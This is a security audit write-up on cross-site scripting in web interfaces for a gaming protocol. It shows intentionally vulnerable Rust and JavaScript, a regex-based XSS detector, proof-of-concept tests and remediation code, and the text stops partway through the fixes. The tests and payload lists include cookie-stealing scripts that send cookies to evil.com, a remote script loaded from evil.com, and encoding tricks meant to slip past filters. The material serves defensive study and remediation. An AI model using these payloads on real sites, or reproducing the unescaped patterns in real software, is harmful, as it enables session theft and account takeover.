# VUL-100: Cross-Site Scripting Potential

## Executive Summary

- **Vulnerability ID**: VUL-100
- **Severity**: Low
- **CVSS Score**: 3.4/10
- **Category**: Input Validation / Web Security
- **Component**: Web Interface / Frontend Display
- **Impact**: Potential for client-side script injection in web interfaces with limited scope affecting non-critical display components and user interaction elements

## Vulnerability Details

### Root Cause Analysis

The vulnerability stems from insufficient sanitization of user-provided content that is rendered in web interfaces associated with the gaming protocol. While the core Solana smart contracts are not directly affected, supporting web applications for game statistics, player profiles, and administrative interfaces may be vulnerable to cross-site scripting attacks.

**Primary Issues:**
1. Unescaped user input in HTML output
2. Insufficient sanitization of player-generated content
3. Missing Content Security Policy (CSP) headers
4. Unsafe DOM manipulation in JavaScript
5. Inadequate validation of rich content inputs

### Vulnerable Code Patterns

```rust
// Backend API serving user content
use serde::{Deserialize, Serialize};
use warp::reply::html;

#[derive(Serialize, Deserialize)]
pub struct PlayerProfile {
    pub player_id: String,
    pub display_name: String,
    pub bio: String,
    pub achievements: Vec<String>,
    pub game_stats: GameStats,
}

#[derive(Serialize, Deserialize)]
pub struct GameStats {
    pub wins: u32,
    pub losses: u32,
    pub kill_count: u32,
    pub death_count: u32,
}

// VULNERABLE: Direct HTML generation without escaping
pub fn generate_player_profile_html(profile: &PlayerProfile) -> String {
    format!(
        r#"
        <!DOCTYPE html>
        <html>
        <head>
            <title>Player Profile</title>
        </head>
        <body>
            <h1>Player: {}</h1>
            <div class="bio">
                <h2>Bio:</h2>
                <p>{}</p>
            </div>
            <div class="achievements">
                <h2>Achievements:</h2>
                <ul>
                    {}
                </ul>
            </div>
            <div class="stats">
                <h2>Game Statistics:</h2>
                <p>Wins: {}</p>
                <p>Losses: {}</p>
                <p>K/D Ratio: {:.2}</p>
            </div>
            <script>
                // VULNERABLE: Directly embedding user data in JavaScript
                var playerName = "{}";
                var playerBio = "{}";
                updatePlayerDisplay(playerName, playerBio);
            </script>
        </body>
        </html>
        "#,
        profile.display_name,  // VULNERABLE: No HTML escaping
        profile.bio,           // VULNERABLE: User content directly embedded
        profile.achievements.iter()
            .map(|achievement| format!("<li>{}</li>", achievement))  // VULNERABLE: No escaping
            .collect::<Vec<_>>()
            .join(""),
        profile.game_stats.wins,
        profile.game_stats.losses,
        if profile.game_stats.death_count > 0 {
            profile.game_stats.kill_count as f64 / profile.game_stats.death_count as f64
        } else {
            profile.game_stats.kill_count as f64
        },
        profile.display_name,  // VULNERABLE: JavaScript injection
        profile.bio           // VULNERABLE: JavaScript injection
    )
}

// VULNERABLE: Leaderboard display without sanitization
pub fn generate_leaderboard_html(players: Vec<PlayerProfile>) -> String {
    let mut html = String::from(
        r#"
        <!DOCTYPE html>
        <html>
        <head>
            <title>Leaderboard</title>
        </head>
        <body>
            <h1>Top Players</h1>
            <table>
                <tr>
                    <th>Rank</th>
                    <th>Player Name</th>
                    <th>Wins</th>
                    <th>Bio</th>
                </tr>
        "#
    );

    for (rank, player) in players.iter().enumerate() {
        // VULNERABLE: Direct string interpolation
        html.push_str(&format!(
            r#"
            <tr onclick="showPlayerDetails('{}', '{}')">
                <td>{}</td>
                <td>{}</td>
                <td>{}</td>
                <td>{}</td>
            </tr>
            "#,
            player.player_id,     // VULNERABLE: JavaScript injection
            player.bio,           // VULNERABLE: JavaScript injection
            rank + 1,
            player.display_name,  // VULNERABLE: HTML injection
            player.game_stats.wins,
            player.bio           // VULNERABLE: HTML injection
        ));
    }

    html.push_str(
        r#"
            </table>
            <script>
                function showPlayerDetails(playerId, bio) {
                    // VULNERABLE: Unsafe DOM manipulation
                    document.getElementById('details').innerHTML =
                        '<h3>Player: ' + playerId + '</h3><p>' + bio + '</p>';
                }
            </script>
        </body>
        </html>
        "#
    );

    html
}

// VULNERABLE: Game chat/messaging system
#[derive(Serialize, Deserialize)]
pub struct ChatMessage {
    pub player_id: String,
    pub message: String,
    pub timestamp: u64,
}

pub fn generate_chat_html(messages: Vec<ChatMessage>) -> String {
    let mut chat_html = String::from(
        r#"
        <div id="chat-container">
            <h3>Game Chat</h3>
            <div id="messages">
        "#
    );

    for message in messages {
        // VULNERABLE: Chat messages not sanitized
        chat_html.push_str(&format!(
            r#"
            <div class="message">
                <span class="player">{}</span>:
                <span class="content">{}</span>
                <span class="timestamp">{}</span>
            </div>
            "#,
            message.player_id,  // VULNERABLE: HTML injection
            message.message,    // VULNERABLE: Script injection
            message.timestamp
        ));
    }

    chat_html.push_str(
        r#"
            </div>
            <input type="text" id="messageInput" placeholder="Type your message...">
            <button onclick="sendMessage()">Send</button>
        </div>
        <script>
            function sendMessage() {
                var input = document.getElementById('messageInput');
                var message = input.value;

                // VULNERABLE: Unsafe DOM manipulation
                document.getElementById('messages').innerHTML +=
                    '<div class="message"><span class="player">You</span>: <span class="content">' +
                    message + '</span></div>';

                input.value = '';
            }
        </script>
        "#
    );

    chat_html
}
```

**Frontend JavaScript Vulnerabilities:**
```javascript
// VULNERABLE: Client-side JavaScript with XSS potential

// VULNERABLE: Unsafe evaluation of user data
function updatePlayerStats(playerData) {
    // playerData comes from API without validation
    document.getElementById('playerName').innerHTML = playerData.displayName;
    document.getElementById('playerBio').innerHTML = playerData.bio;

    // VULNERABLE: Direct HTML injection
    var achievementsList = '<ul>';
    playerData.achievements.forEach(function(achievement) {
        achievementsList += '<li>' + achievement + '</li>';  // No escaping
    });
    achievementsList += '</ul>';
    document.getElementById('achievements').innerHTML = achievementsList;
}

// VULNERABLE: Dynamic script loading
function loadPlayerWidget(playerId, customScript) {
    // VULNERABLE: Executing user-provided script
    var script = document.createElement('script');
    script.src = 'data:text/javascript,' + encodeURIComponent(customScript);
    document.head.appendChild(script);
}

// VULNERABLE: URL parameter injection
function displayGameResult() {
    var urlParams = new URLSearchParams(window.location.search);
    var winner = urlParams.get('winner');
    var message = urlParams.get('message');

    // VULNERABLE: URL parameters directly in DOM
    document.getElementById('winner').innerHTML = 'Winner: ' + winner;
    document.getElementById('message').innerHTML = message;
}

// VULNERABLE: Unsafe JSON parsing and display
function showNotification(jsonData) {
    try {
        var data = JSON.parse(jsonData);

        // VULNERABLE: Object properties directly in innerHTML
        document.getElementById('notification').innerHTML =
            '<div class="alert">' + data.title + ': ' + data.message + '</div>';

    } catch (e) {
        console.error('Failed to parse notification data');
    }
}

// VULNERABLE: Template string injection
function createPlayerCard(playerInfo) {
    var template = `
        <div class="player-card">
            <h3>${playerInfo.name}</h3>
            <p>${playerInfo.bio}</p>
            <div class="stats">
                <span>Wins: ${playerInfo.wins}</span>
                <span>Losses: ${playerInfo.losses}</span>
            </div>
        </div>
    `;

    // VULNERABLE: Template with unescaped user data
    return template;
}
```

## Advanced Analysis Framework

### XSS Detection and Analysis Tools

```rust
use regex::Regex;
use std::collections::HashMap;

pub struct XSSDetector {
    script_patterns: Vec<Regex>,
    html_patterns: Vec<Regex>,
    url_patterns: Vec<Regex>,
    event_handler_patterns: Vec<Regex>,
}

impl XSSDetector {
    pub fn new() -> Self {
        let script_patterns = vec![
            Regex::new(r"(?i)<script[^>]*>.*?</script>").unwrap(),
            Regex::new(r"(?i)javascript:").unwrap(),
            Regex::new(r"(?i)vbscript:").unwrap(),
            Regex::new(r"(?i)data:text/html").unwrap(),
            Regex::new(r"(?i)expression\s*\(").unwrap(),
        ];

        let html_patterns = vec![
            Regex::new(r"(?i)<(iframe|object|embed|applet|meta)[^>]*>").unwrap(),
            Regex::new(r"(?i)<img[^>]+src\s*=\s*[\"']?javascript:").unwrap(),
            Regex::new(r"(?i)<[^>]+style\s*=\s*[\"'][^\"']*expression\s*\(").unwrap(),
        ];

        let url_patterns = vec![
            Regex::new(r"(?i)data:text/javascript").unwrap(),
            Regex::new(r"(?i)data:application/javascript").unwrap(),
            Regex::new(r"(?i)data:text/html").unwrap(),
        ];

        let event_handler_patterns = vec![
            Regex::new(r"(?i)on\w+\s*=").unwrap(),
            Regex::new(r"(?i)(onclick|onload|onerror|onmouseover|onfocus)\s*=").unwrap(),
        ];

        Self {
            script_patterns,
            html_patterns,
            url_patterns,
            event_handler_patterns,
        }
    }

    pub fn analyze_input(&self, input: &str) -> XSSAnalysis {
        let mut analysis = XSSAnalysis {
            input_text: input.to_string(),
            risk_score: 0.0,
            detected_patterns: Vec::new(),
            xss_type: XSSType::None,
            recommended_action: XSSAction::Allow,
        };

        // Check for script injection
        for pattern in &self.script_patterns {
            if pattern.is_match(input) {
                analysis.risk_score += 40.0;
                analysis.detected_patterns.push("Script injection pattern".to_string());
                analysis.xss_type = XSSType::ScriptInjection;
            }
        }

        // Check for HTML injection
        for pattern in &self.html_patterns {
            if pattern.is_match(input) {
                analysis.risk_score += 30.0;
                analysis.detected_patterns.push("HTML injection pattern".to_string());
                if matches!(analysis.xss_type, XSSType::None) {
                    analysis.xss_type = XSSType::HTMLInjection;
                }
            }
        }

        // Check for URL-based injection
        for pattern in &self.url_patterns {
            if pattern.is_match(input) {
                analysis.risk_score += 35.0;
                analysis.detected_patterns.push("URL injection pattern".to_string());
                if matches!(analysis.xss_type, XSSType::None) {
                    analysis.xss_type = XSSType::URLInjection;
                }
            }
        }

        // Check for event handler injection
        for pattern in &self.event_handler_patterns {
            if pattern.is_match(input) {
                analysis.risk_score += 25.0;
                analysis.detected_patterns.push("Event handler injection".to_string());
                if matches!(analysis.xss_type, XSSType::None) {
                    analysis.xss_type = XSSType::EventHandler;
                }
            }
        }

        // Determine recommended action
        analysis.recommended_action = if analysis.risk_score > 40.0 {
            XSSAction::Block
        } else if analysis.risk_score > 20.0 {
            XSSAction::Sanitize
        } else if analysis.risk_score > 5.0 {
            XSSAction::Escape
        } else {
            XSSAction::Allow
        };

        analysis
    }

    pub fn scan_html_template(&self, template: &str) -> TemplateAnalysis {
        let mut analysis = TemplateAnalysis {
            template_content: template.to_string(),
            unsafe_interpolations: 0,
            missing_escaping: Vec::new(),
            csp_compatibility: true,
            security_recommendations: Vec::new(),
        };

        // Look for unsafe interpolation patterns
        let interpolation_patterns = vec![
            r"\{\{[^}]*\}\}",  // Handlebars/Mustache
            r"\{[^}]*\}",      // Simple interpolation
            r"\$\{[^}]*\}",    // Template literals
        ];

        for pattern_str in interpolation_patterns {
            let pattern = Regex::new(pattern_str).unwrap();
            let matches = pattern.find_iter(template);

            for mat in matches {
                analysis.unsafe_interpolations += 1;
                analysis.missing_escaping.push(mat.as_str().to_string());
            }
        }

        // Check for inline scripts (CSP incompatible)
        if template.contains("<script") && !template.contains("src=") {
            analysis.csp_compatibility = false;
            analysis.security_recommendations.push(
                "Remove inline scripts for CSP compatibility".to_string()
            );
        }

        // Check for inline event handlers
        let event_handler_regex = Regex::new(r"(?i)on\w+\s*=\s*[\"'][^\"']*[\"']").unwrap();
        if event_handler_regex.is_match(template) {
            analysis.csp_compatibility = false;
            analysis.security_recommendations.push(
                "Remove inline event handlers".to_string()
            );
        }

        if analysis.unsafe_interpolations > 0 {
            analysis.security_recommendations.push(
                "Implement proper HTML escaping for all user data".to_string()
            );
        }

        analysis
    }
}

#[derive(Debug)]
pub struct XSSAnalysis {
    input_text: String,
    risk_score: f64,
    detected_patterns: Vec<String>,
    xss_type: XSSType,
    recommended_action: XSSAction,
}

#[derive(Debug)]
pub enum XSSType {
    None,
    ScriptInjection,
    HTMLInjection,
    URLInjection,
    EventHandler,
}

#[derive(Debug)]
pub enum XSSAction {
    Allow,
    Escape,
    Sanitize,
    Block,
}

#[derive(Debug)]
pub struct TemplateAnalysis {
    template_content: String,
    unsafe_interpolations: usize,
    missing_escaping: Vec<String>,
    csp_compatibility: bool,
    security_recommendations: Vec<String>,
}
```

### Content Security Policy Analysis

```rust
pub struct CSPAnalyzer;

impl CSPAnalyzer {
    pub fn analyze_csp_header(&self, csp_header: Option<&str>) -> CSPAnalysis {
        let mut analysis = CSPAnalysis {
            has_csp: csp_header.is_some(),
            directives: HashMap::new(),
            security_score: 0.0,
            recommendations: Vec::new(),
        };

        if let Some(csp) = csp_header {
            analysis.directives = self.parse_csp_directives(csp);
            analysis.security_score = self.calculate_csp_security_score(&analysis.directives);
            analysis.recommendations = self.generate_csp_recommendations(&analysis.directives);
        } else {
            analysis.recommendations.push("Implement Content Security Policy header".to_string());
        }

        analysis
    }

    fn parse_csp_directives(&self, csp: &str) -> HashMap<String, Vec<String>> {
        let mut directives = HashMap::new();

        for directive in csp.split(';') {
            let parts: Vec<&str> = directive.trim().split_whitespace().collect();
            if let Some(directive_name) = parts.first() {
                let sources = parts[1..].iter().map(|s| s.to_string()).collect();
                directives.insert(directive_name.to_string(), sources);
            }
        }

        directives
    }

    fn calculate_csp_security_score(&self, directives: &HashMap<String, Vec<String>>) -> f64 {
        let mut score = 0.0;

        // Check for script-src directive
        if let Some(script_sources) = directives.get("script-src") {
            if script_sources.contains(&"'none'".to_string()) {
                score += 30.0;
            } else if script_sources.contains(&"'self'".to_string()) &&
                     !script_sources.contains(&"'unsafe-inline'".to_string()) &&
                     !script_sources.contains(&"'unsafe-eval'".to_string()) {
                score += 25.0;
            } else {
                score += 10.0;
            }
        }

        // Check for object-src directive
        if let Some(object_sources) = directives.get("object-src") {
            if object_sources.contains(&"'none'".to_string()) {
                score += 20.0;
            }
        }

        // Check for base-uri directive
        if directives.contains_key("base-uri") {
            score += 15.0;
        }

        // Check for default-src directive
        if directives.contains_key("default-src") {
            score += 10.0;
        }

        score.min(100.0)
    }

    fn generate_csp_recommendations(&self, directives: &HashMap<String, Vec<String>>) -> Vec<String> {
        let mut recommendations = Vec::new();

        if !directives.contains_key("script-src") {
            recommendations.push("Add script-src directive to control script execution".to_string());
        }

        if !directives.contains_key("object-src") {
            recommendations.push("Add object-src 'none' to prevent plugin execution".to_string());
        }

        if let Some(script_sources) = directives.get("script-src") {
            if script_sources.contains(&"'unsafe-inline'".to_string()) {
                recommendations.push("Remove 'unsafe-inline' from script-src".to_string());
            }
            if script_sources.contains(&"'unsafe-eval'".to_string()) {
                recommendations.push("Remove 'unsafe-eval' from script-src".to_string());
            }
        }

        recommendations
    }
}

#[derive(Debug)]
pub struct CSPAnalysis {
    has_csp: bool,
    directives: HashMap<String, Vec<String>>,
    security_score: f64,
    recommendations: Vec<String>,
}
```

## Economic Impact Calculator

### XSS Impact Assessment Framework

```rust
pub struct XSSImpactCalculator;

impl XSSImpactCalculator {
    pub fn calculate_impact(&self, xss_context: XSSContext, user_base_size: usize) -> XSSImpactAssessment {
        let base_impact = match xss_context {
            XSSContext::PlayerProfile => XSSBaseImpact {
                user_exposure_percent: 5.0,
                data_sensitivity: 20.0,
                reputation_damage: 15.0,
                technical_complexity: 30.0,
            },
            XSSContext::GameChat => XSSBaseImpact {
                user_exposure_percent: 15.0,
                data_sensitivity: 10.0,
                reputation_damage: 25.0,
                technical_complexity: 40.0,
            },
            XSSContext::Leaderboard => XSSBaseImpact {
                user_exposure_percent: 25.0,
                data_sensitivity: 15.0,
                reputation_damage: 30.0,
                technical_complexity: 20.0,
            },
            XSSContext::AdminInterface => XSSBaseImpact {
                user_exposure_percent: 1.0,
                data_sensitivity: 80.0,
                reputation_damage: 60.0,
                technical_complexity: 70.0,
            },
        };

        let affected_users = (user_base_size as f64 * base_impact.user_exposure_percent / 100.0) as usize;

        XSSImpactAssessment {
            affected_users,
            potential_data_exposure: base_impact.data_sensitivity,
            reputation_impact_score: base_impact.reputation_damage,
            estimated_cleanup_cost: self.calculate_cleanup_cost(&xss_context, affected_users),
            business_disruption_hours: self.calculate_disruption_time(&xss_context),
            compliance_risk_score: base_impact.data_sensitivity * 0.8,
        }
    }

    fn calculate_cleanup_cost(&self, context: &XSSContext, affected_users: usize) -> f64 {
        let base_cost = match context {
            XSSContext::PlayerProfile => 1500.0,
            XSSContext::GameChat => 2000.0,
            XSSContext::Leaderboard => 1200.0,
            XSSContext::AdminInterface => 5000.0,
        };

        let user_factor = if affected_users > 1000 {
            1.5
        } else if affected_users > 100 {
            1.2
        } else {
            1.0
        };

        base_cost * user_factor
    }

    fn calculate_disruption_time(&self, context: &XSSContext) -> f64 {
        match context {
            XSSContext::PlayerProfile => 4.0,
            XSSContext::GameChat => 8.0,
            XSSContext::Leaderboard => 2.0,
            XSSContext::AdminInterface => 24.0,
        }
    }
}

#[derive(Debug)]
pub enum XSSContext {
    PlayerProfile,
    GameChat,
    Leaderboard,
    AdminInterface,
}

#[derive(Debug)]
pub struct XSSBaseImpact {
    user_exposure_percent: f64,
    data_sensitivity: f64,
    reputation_damage: f64,
    technical_complexity: f64,
}

#[derive(Debug)]
pub struct XSSImpactAssessment {
    affected_users: usize,
    potential_data_exposure: f64,
    reputation_impact_score: f64,
    estimated_cleanup_cost: f64,
    business_disruption_hours: f64,
    compliance_risk_score: f64,
}
```

## Proof of Concept

### XSS Attack Demonstrations

```rust
#[cfg(test)]
mod xss_poc {
    use super::*;

    #[test]
    fn demonstrate_stored_xss_in_profile() {
        // Simulate stored XSS in player profile
        let malicious_bio = r#"Normal bio content <script>alert('XSS in profile!')</script>"#;
        let malicious_name = r#"Player<img src=x onerror=alert('XSS')>"#;

        let malicious_profile = PlayerProfile {
            player_id: "attacker123".to_string(),
            display_name: malicious_name.to_string(),
            bio: malicious_bio.to_string(),
            achievements: vec![
                "Achievement 1".to_string(),
                r#"<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"#.to_string(),
            ],
            game_stats: GameStats {
                wins: 10,
                losses: 5,
                kill_count: 50,
                death_count: 25,
            },
        };

        let html_output = generate_player_profile_html(&malicious_profile);

        println!("Generated HTML contains XSS payload:");
        println!("{}", html_output);

        // Verify XSS payload is present
        assert!(html_output.contains("<script>alert('XSS in profile!')</script>"));
        assert!(html_output.contains("onerror=alert('XSS')"));
    }

    #[test]
    fn demonstrate_reflected_xss_in_chat() {
        let malicious_messages = vec![
            ChatMessage {
                player_id: "user1".to_string(),
                message: "Normal message".to_string(),
                timestamp: 1234567890,
            },
            ChatMessage {
                player_id: "attacker".to_string(),
                message: r#"<script>fetch('http://evil.com/steal', {method: 'POST', body: document.cookie})</script>"#.to_string(),
                timestamp: 1234567891,
            },
            ChatMessage {
                player_id: "victim".to_string(),
                message: r#"Hello <img src="x" onerror="eval(atob('YWxlcnQoJ1hTUycpOw=='))"> there"#.to_string(),
                timestamp: 1234567892,
            },
        ];

        let chat_html = generate_chat_html(malicious_messages);

        println!("Chat HTML with XSS:");
        println!("{}", chat_html);

        // Verify XSS payloads are embedded
        assert!(chat_html.contains("<script>fetch('http://evil.com/steal'"));
        assert!(chat_html.contains("onerror=\"eval(atob"));
    }

    #[test]
    fn demonstrate_dom_based_xss() {
        // Simulate DOM-based XSS through URL manipulation
        let test_url_params = vec![
            ("winner", "Normal Player"),
            ("message", "Congratulations!"),
            ("winner", r#"<script>alert('DOM XSS')</script>"#),
            ("message", r#"Game Over<img src=x onerror=alert('XSS')>"#),
        ];

        println!("DOM XSS simulation:");
        for (param, value) in test_url_params {
            println!("URL parameter {}={}", param, value);

            // Simulate what happens in displayGameResult()
            let unsafe_display = format!("Winner: {}", value);
            println!("Unsafe display: {}", unsafe_display);

            if value.contains("<script>") || value.contains("onerror=") {
                println!("WARNING: XSS payload detected in URL parameter!");
            }
        }
    }

    #[test]
    fn demonstrate_template_injection() {
        let player_info = serde_json::json!({
            "name": "<script>alert('Template XSS')</script>",
            "bio": "Player bio with <img src=x onerror=alert('Bio XSS')>",
            "wins": 100,
            "losses": 50
        });

        // Simulate template string injection
        let unsafe_template = format!(
            r#"
            <div class="player-card">
                <h3>{}</h3>
                <p>{}</p>
                <div class="stats">
                    <span>Wins: {}</span>
                    <span>Losses: {}</span>
                </div>
            </div>
            "#,
            player_info["name"].as_str().unwrap(),
            player_info["bio"].as_str().unwrap(),
            player_info["wins"],
            player_info["losses"]
        );

        println!("Template with XSS injection:");
        println!("{}", unsafe_template);

        assert!(unsafe_template.contains("<script>alert('Template XSS')"));
        assert!(unsafe_template.contains("onerror=alert('Bio XSS')"));
    }

    #[test]
    fn test_xss_detection_system() {
        let detector = XSSDetector::new();

        let test_inputs = vec![
            "Normal player name",
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "user<svg onload=alert('XSS')>",
            "data:text/html,<script>alert('XSS')</script>",
        ];

        for input in test_inputs {
            let analysis = detector.analyze_input(input);

            println!("\nInput: '{}'", input);
            println!("Risk Score: {:.1}", analysis.risk_score);
            println!("XSS Type: {:?}", analysis.xss_type);
            println!("Action: {:?}", analysis.recommended_action);

            if !analysis.detected_patterns.is_empty() {
                println!("Detected patterns: {:?}", analysis.detected_patterns);
            }
        }
    }
}
```

### Advanced XSS Payload Testing

```rust
pub struct XSSPayloadTester;

impl XSSPayloadTester {
    pub fn test_advanced_payloads() -> Vec<XSSTestResult> {
        let payloads = vec![
            // Script-based payloads
            "<script>alert('Basic XSS')</script>",
            "<ScRiPt>alert('Case bypass')</ScRiPt>",
            "<script src='http://evil.com/xss.js'></script>",

            // Event handler payloads
            "<img src=x onerror=alert('Event XSS')>",
            "<body onload=alert('Body XSS')>",
            "<svg onload=alert('SVG XSS')>",

            // URL-based payloads
            "javascript:alert('JavaScript URL')",
            "data:text/html,<script>alert('Data URL')</script>",
            "vbscript:alert('VBScript')",

            // Advanced evasion
            "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>",
            "<svg><script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script></svg>",

            // Template injection
            "${alert('Template XSS')}",
            "{{constructor.constructor('alert(\"XSS\")')()}}",

            // CSS-based
            "<style>@import'javascript:alert(\"CSS XSS\")'</style>",
            "<link rel=stylesheet href='javascript:alert(\"Link XSS\")'>",
        ];

        let detector = XSSDetector::new();
        let mut results = Vec::new();

        for payload in payloads {
            let analysis = detector.analyze_input(payload);

            results.push(XSSTestResult {
                payload: payload.to_string(),
                detected: analysis.risk_score > 20.0,
                risk_score: analysis.risk_score,
                bypassed_detection: analysis.risk_score < 10.0 && payload.contains("alert"),
            });
        }

        results
    }

    pub fn test_encoding_bypasses() -> Vec<XSSTestResult> {
        let encoded_payloads = vec![
            // URL encoding
            "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",

            // HTML entities
            "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;",

            // Unicode encoding
            "<script>alert(\\u0027XSS\\u0027)</script>",

            // Hex encoding
            "<script>alert(\\x27XSS\\x27)</script>",

            // Double encoding
            "%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E",
        ];

        let detector = XSSDetector::new();
        let mut results = Vec::new();

        for payload in encoded_payloads {
            let analysis = detector.analyze_input(payload);

            results.push(XSSTestResult {
                payload: payload.to_string(),
                detected: analysis.risk_score > 15.0,
                risk_score: analysis.risk_score,
                bypassed_detection: analysis.risk_score < 5.0,
            });
        }

        results
    }
}

#[derive(Debug)]
pub struct XSSTestResult {
    payload: String,
    detected: bool,
    risk_score: f64,
    bypassed_detection: bool,
}
```

## Remediation Strategy

### Immediate Fixes

**1. HTML Escaping Implementation**
```rust
use html_escape::{encode_text, encode_quoted_attribute};

// SECURE: Proper HTML escaping implementation
pub fn generate_secure_player_profile_html(profile: &PlayerProfile) -> String {
    format!(
        r#"
        <!DOCTYPE html>
        <html>
        <head>
            <title>Player Profile</title>
            <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; object-src 'none';">
        </head>
        <body>
            <h1>Player: {}</h1>
            <div class="bio">
                <h2>Bio:</h2>
                <p>{}</p>
            </div>
            <div class="achievements">
                <h2>Achievements:</h2>
                <ul>
                    {}
                </ul>
            </div>
            <div class="stats">
                <h2>Game Statistics:</h2>
                <p>Wins: {}</p>
                <p>Losses: {}</p>
                <p>K/D Ratio: {:.2}</p>
            </div>
            <script src="/js/player-profile.js" nonce="{}"></script>
        </body>
        </html>
        "#,
        encode_text(&profile.display_name),  // SECURE: HTML escaped
        encode_text(&profile.bio),           // SECURE: HTML escaped
        profile.achievements.iter()
            .map(|achievement| format!("<li>{}</li>", encode_text(achievement)))  // SECURE: Escaped
            .collect::<Vec<_>>()
            .join(""),
        profile.game_stats.wins,
        profile.game_stats.losses,
        if profile.game_stats.death_count > 0 {
            profile.game_stats.kill_count as f64 / profile.game_stats.death_count as f64
        } else {
            profile.game_stats.kill_count as f64
        },
        generate_csp_nonce()  // SECURE: CSP nonce for scripts
    )
}

// SECURE: Input validation and sanitization
pub struct InputSanitizer {
    allowed_html_tags: Vec<String>,
    max_length_limits: std::collections::HashMap<String, usize>,
}

impl InputSanitizer {
    pub fn new() -> Self {
        let mut limits = std::collections::HashMap::new();
        limits.insert("display_name".to_string(), 50);
        limits.insert("bio".to_string(), 1000);
        limits.insert("message".to_string(), 500);

        Self {
            allowed_html_tags: vec![], // No HTML allowed by default
            max_length_limits: limits,
        }
    }

    pub fn sanitize_user_input(&self, input: &str, field_type: &str) -> Result<String, SanitizationError> {
        // Length validation
        if let Some(&max_length) = self.max_length_limits.get(field_type) {
            if input.len() > max_length {
                return Err(SanitizationError::TooLong(max_length));
            }
        }

        // XSS detection
        let detector = XSSDetector::new();
        let analysis = detector.analyze_input(input);

        match analysis.recommended_action {
            XSSAction::Block => {
                return Err(SanitizationError::SecurityThreat(
                    "Potential XSS attack detected".to_string()
                ));
            },
            XSSAction::Sanitize => {
                return Ok(self.strip_html_tags(input));
            },
            XSSAction::Escape => {
                return Ok(encode_text(input).to_string());
            },
            XSSAction::Allow => {
                return Ok(input.to_string());
            },
        }
    }

    fn strip_html_tags(&self, input: &str) -> String {
        // Simple HTML tag removal (in production, use a proper HTML sanitizer library)
        let tag_regex = regex::Regex::new(r"<[^>]*>").unwrap();
        tag_regex.replace_all(input, "").to_string()
    }
}

#[derive(Debug)]
pub enum SanitizationError {
    TooLong(usize),
    SecurityThreat(String),
    InvalidFormat(String),
}

impl std::fmt::Display for SanitizationError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::TooLong(max) => write!(f, "Input exceeds maximum length of {}", max),
            Self::SecurityThreat(msg) => write!(f, "Security threat detected: {}", msg),
            Self::InvalidFormat(msg) => write!(f, "Invalid format: {}", msg),
        }
    }
}

impl std::error::Error for SanitizationError {}

// SECURE: CSP nonce generation
fn generate_csp_nonce() -> String {
    use rand::{RngCore, SeedableRng};
    use rand_chacha::ChaCha20Rng;

    let mut rng = ChaCha20Rng::from_entropy();
    let mut nonce_bytes = [0u8; 16];
    rng.fill_bytes(&mut nonce_bytes);
    base64::encode(&nonce_bytes)
}
```

**2. Frontend Security Implementation**
```javascript
// SECURE: Frontend XSS prevention

// SECURE: Safe DOM manipulation
function updatePlayerStatsSecure(playerData) {
    // Validate data structure
    if (!playerData || typeof playerData !== 'object') {
        console.error('Invalid player data');
        return;
    }

    // SECURE: Use textContent instead of innerHTML
    const playerNameElement = document.getElementById('playerName');
    if (playerNameElement) {
        playerNameElement.textContent = playerData.displayName || 'Unknown Player';
    }

    const playerBioElement = document.getElementById('playerBio');
    if (playerBioElement) {
        playerBioElement.textContent = playerData.bio || 'No bio available';
    }

    // SECURE: Validate and escape achievement data
    const achievementsElement = document.getElementById('achievements');
    if (achievementsElement && Array.isArray(playerData.achievements)) {
        achievementsElement.innerHTML = ''; // Clear existing content

        const ul = document.createElement('ul');
        playerData.achievements.forEach(function(achievement) {
            if (typeof achievement === 'string' && achievement.length <= 100) {
                const li = document.createElement('li');
                li.textContent = achievement; // SECURE: textContent prevents XSS
                ul.appendChild(li);
            }
        });
        achievementsElement.appendChild(ul);
    }
}

// SECURE: Safe template rendering
function createPlayerCardSecure(playerInfo) {
    // Input validation
    if (!playerInfo || typeof playerInfo !== 'object') {
        return '<div class="error">Invalid player data</div>';
    }

    // SECURE: Create DOM elements programmatically
    const cardDiv = document.createElement('div');
    cardDiv.className = 'player-card';

    const nameHeader = document.createElement('h3');
    nameHeader.textContent = playerInfo.name || 'Unknown';
    cardDiv.appendChild(nameHeader);

    const bioP = document.createElement('p');
    bioP.textContent = playerInfo.bio || 'No bio';
    cardDiv.appendChild(bioP);

    const statsDiv = document.createElement('div');
    statsDiv.className = 'stats';

    const winsSpan = document.createElement('span');
    winsSpan.textContent = `Wins: ${parseInt(playerInfo.wins) || 0}`;
    statsDiv.appendChild(winsSpan);

    const lossesSpan = document.createElement('span');
    lossesSpan.textContent = `Losses: ${parseInt(playerInfo.losses) || 0}`;
    statsDiv.appendChild(lossesSpan);

    cardDiv.appendChild(statsDiv);

    return cardDiv.outerHTML;
}

// SECURE: URL parameter handling
function displayGameResultSecure() {
    const urlParams = new URLSearchParams(window.location.search);

    // SECURE: Validate and sanitize URL parameters
    const winner = sanitizeInput(urlParams.get('winner'), 50);
    const message = sanitizeInput(urlParams.get('message'), 200);

    const winnerElement = document.getElementById('winner');
    if (winnerElement && winner) {
        winnerElement.textContent = `Winner: ${winner}`;
    }

    const messageElement = document.getElementById('message');
    if (messageElement && message) {
        messageElement.textContent = message;
    }
}

// SECURE: Input sanitization function
function sanitizeInput(input, maxLength) {
    if (!input || typeof input !== 'string') {
        return '';
    }

    // Length validation
    if (input.length > maxLength) {
        input = input.substring(0, maxLength);
    }

    // Remove potentially dangerous characters
    const dangerousPattern = /[<>'"&]/g;
    return input.replace(dangerousPattern, '');
}

// SECURE: Safe notification display
function showNotificationSecure(title, message) {
    // Input validation
    if (typeof title !== 'string' || typeof message !== 'string') {
        console.error('Invalid notification data');
        return;
    }

    // Length limits
    title = title.substring(0, 100);
    message = message.substring(0, 500);

    // SECURE: Create notification DOM safely
    const notificationDiv = document.createElement('div');
    notificationDiv.className = 'alert';

    const titleElement = document.createElement('strong');
    titleElement.textContent = title;
